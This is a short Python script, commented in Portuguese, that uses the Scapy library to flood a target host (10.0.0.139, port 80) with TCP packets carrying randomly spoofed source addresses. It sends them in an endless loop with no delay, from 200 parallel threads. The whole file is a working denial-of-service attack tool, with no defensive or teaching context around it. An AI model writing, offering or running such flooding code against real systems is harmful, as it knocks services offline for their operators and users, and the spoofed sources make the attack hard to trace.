from scapy.all import *
import threading
def flood():
    #Envia um pacote com a origem randomica para a um alvo na porta 80
    pacote = IP(src=RandIP("*.*.*.*"), dst="10.0.0.139") / TCP(dport=80)
    #Envia um pacote após o outro sem nenhum intervalo entre os pacotes com loop infinito
    send(pacote, loop=1, inter=0)
for x in range(200):
    threading.Thread(target=flood).start()
